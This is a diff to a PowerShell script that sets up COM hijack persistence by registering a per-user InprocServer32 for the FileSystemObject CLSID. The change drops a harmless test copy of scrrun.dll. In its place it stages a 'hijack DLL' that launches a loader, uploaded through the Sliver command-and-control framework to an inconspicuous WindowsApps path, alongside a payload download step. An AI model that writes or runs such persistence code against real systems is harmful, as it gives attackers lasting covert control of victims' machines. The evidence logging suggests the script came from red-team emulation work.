@@ -86,9 +86,8 @@ $COM_PROGID   = "Scripting.FileSystemObject"
 $COM_REG_BASE = "HKCU:\Software\Classes\CLSID\$COM_GUID"
 $COM_INPROC   = "$COM_REG_BASE\InprocServer32"
 
-# Test DLL = copy of the real system COM server for this CLSID
-$SOURCE_DLL   = "$env:SystemRoot\System32\scrrun.dll"
-$DLL_PATH     = "$env:TEMP\scrrun_hijack.dll"
+# Hijack DLL = launches loader on DllMain (uploaded via Sliver)
+$DLL_PATH     = "$env:LOCALAPPDATA\Microsoft\WindowsApps\scrrun_hijack.dll"
 
 $BACKUP_FILE  = "$env:TEMP\com_hijack_backup.json"
 $EVIDENCE_LOG = "$env:TEMP\persist_04_evidence.log"
@@ -152,14 +151,12 @@ function Install-Persistence {
     $payloadPreExisted = Test-Path $PAYLOAD_PATH
     Download-Payload
 
-    if (-not (Test-Path $SOURCE_DLL)) {
-        Write-Error "[!] Source COM DLL not found: $SOURCE_DLL"
+    if (-not (Test-Path $DLL_PATH)) {
+        Write-Host "[!] hijack DLL not found at $DLL_PATH -- upload it first via Sliver" -ForegroundColor Red
+        Write-Host "    upload hijack.dll to $DLL_PATH" -ForegroundColor Yellow
         return $false
     }
-    Copy-Item -Path $SOURCE_DLL -Destination $DLL_PATH -Force
-    Write-Host "[+] Test DLL staged: $DLL_PATH" -ForegroundColor Green
-    Write-Host "    (copy of $SOURCE_DLL -- real COM server: DllGetClassObject /" -ForegroundColor Gray
-    Write-Host "     DllCanUnloadNow exported, architecture matches local System32)" -ForegroundColor Gray
+    Write-Host "[+] Hijack DLL found: $DLL_PATH" -ForegroundColor Green
 
     Backup-OriginalState -PayloadPreExisted $payloadPreExisted
 
